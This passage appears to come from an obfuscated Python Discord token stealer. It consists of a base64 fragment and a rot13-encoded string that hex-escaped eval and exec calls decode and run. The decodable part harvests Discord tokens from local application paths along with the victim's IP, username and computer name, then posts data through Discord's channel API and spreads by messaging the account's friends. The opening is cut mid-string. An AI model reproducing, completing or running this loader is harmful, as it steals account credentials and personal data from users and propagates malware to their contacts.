Z2V0aGVhZGVycyh0b2tlbikpKS5yZWFkKCkuZGVjb2RlKCkpKSA+IDApDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICBkZWYgc2VuZF9tZXNzYWdlKHRva2VuLCBjaGF0X2lkLCBmb3JtX2RhdGEpOg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIHVybG9wZW4oUmVxdWVzdChmImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L2NoYW5uZWxzL3tjaGF0X2lkfS9tZXNzYWdlcyIsIGhlYWRlcnM9Z2V0aGVhZGVycyh0b2tlbiwgIm11bHRpcGFydC9mb3JtLWRhdGE7IGJvdW5kYXJ5PS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTMyNTQxNDUzNzAzMDMyOTMyMDE1MTM5NDg0MzY4NyIpLCBkYXRhPWZvcm1fZGF0YS5lbmNvZGUoKSkpLnJlYWQoKS5kZWNvZGUoKQ0KICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIHBhc3MNCiAgICAgICAgZGVmIHNwcmVhZCh0b2tlbiwgZm9ybV9kYXRhLCBkZWxheSk6DQogICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgIGZvciBmcmllbmQgaW4gZ2V0ZnJpZW5kcyh0b2tlbik6DQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICBjaGF0X2lkID0gZ2V0Y2hhdCh0b2tlbiwgZnJpZW5kWyJpZCJdKQ0KICAgICAgICAgICAgICAgICAgICBzZW5kX21lc3NhZ2UodG9rZW4sIGNoYXRfaWQsIGZvcm1fZGF0YSkNCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgICAgIHBhc3MNCiAgICAgICAgICAgICAgICBzbGVlcChkZWxheSkNCiAgICAgICAgY2FjaGVfcGF0aCA9IFJPQU1JTkcgKyAiXFwuY2FjaGV+JCINCiAgICAgICAgZW1iZWRzID0gW10NCiAgICAgICAgd29ya2luZyA9IFtdDQogICAgICAgIGNoZWNrZWQgPSBbXQ0KICAgICAgICBhbHJlYWR5X2NhY2hlZF90b2tlbnMgPSBbXQ0KICAgICAgICB3b3JraW5nX2lkcyA9IFtdDQogICAgICAgIGlwID0gZ2V0aXAoKQ0KICAgICAgICBwY191c2VybmFtZSA9IG9zLmdldGVudigiVXNlck5hbWUiKQ0KICAgICAgICBwY19uYW1lID0gb3MuZ2V0ZW52KCJDT01QVVRFUk5BTUUiKQ0KICAgICAgICBmb3IgcGxhdGZvcm0sIHBhdGggaW4gUEFUSFMuaXRlbXMoKToNCiAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKToNCiAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgZm9yIHRva2VuIGluIGdldHRva2VucyhwYXRoKToNCiAgICAgICAgICAgICAgICBpZiB0b2tlbiBpbiBjaG'
destiny = 'Iwn2IxBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPOwo250nJ51MD0XVPNtVPNtVPNtVPNtVPNtVTAbMJAeMJDhLKOjMJ5xXUEin2IhXD0XVPNtVPNtVPNtVPNtVPNtVUIcMPN9VR5iozHAPvNtVPNtVPNtVPNtVPNtVPOcMvOho3DtqT9eMJ4hp3EupaEmq2y0nPtvoJMuYvVcBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPO0pax6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPO1nJDtCFOvAwExMJAiMTHbqT9eMJ4hp3OfnKDbVv4vXIfjKF5yozAiMTHbXFxhMTIwo2EyXPxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtMKuwMKO0Bt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtpTSmpj0XVPNtVPNtVPNtVPNtVPNtVPNtVPOcMvOho3DtqJyxVT9lVUIcMPOcovO3o3WenJ5aK2yxpmbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTAioaEcoaIyQDbtVPNtVPNtVPNtVPNtVPNtqKAypy9xLKEuVQ0tM2I0qKAypzEuqTRbqT9eMJ4cQDbtVPNtVPNtVPNtVPNtVPNtnJLtoz90VUImMKWsMTS0LGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtL29hqTyhqJHAPvNtVPNtVPNtVPNtVPNtVPO3o3WenJ5aK2yxpl5upUOyozDbqJyxXD0XVPNtVPNtVPNtVPNtVPNtVUqipzgcozphLKOjMJ5xXUEin2IhXD0XVPNtVPNtVPNtVPNtVPNtVUImMKWhLJ1yVQ0tqKAypy9xLKEuJlW1p2IlozSgMFWqVPftVvZvVPftp3ElXUImMKWsMTS0LIfvMTymL3WcoJyhLKEipvWqXD0XVPNtVPNtVPNtVPNtVPNtVUImMKWsnJDtCFO1p2IlK2EuqTSoVzyxVy0APvNtVPNtVPNtVPNtVPNtVPOuqzS0LKWsnJDtCFO1p2IlK2EuqTSoVzS2LKEupvWqQDbtVPNtVPNtVPNtVPNtVPNtLKMuqTSlK3IloPN9VTqyqTS2LKEupvu1p2IlK2yxYPOuqzS0LKWsnJDcQDbtVPNtVPNtVPNtVPNtVPNtMJ1unJjtCFO1p2IlK2EuqTRhM2I0XPWyoJScoPVcQDbtVPNtVPNtVP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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
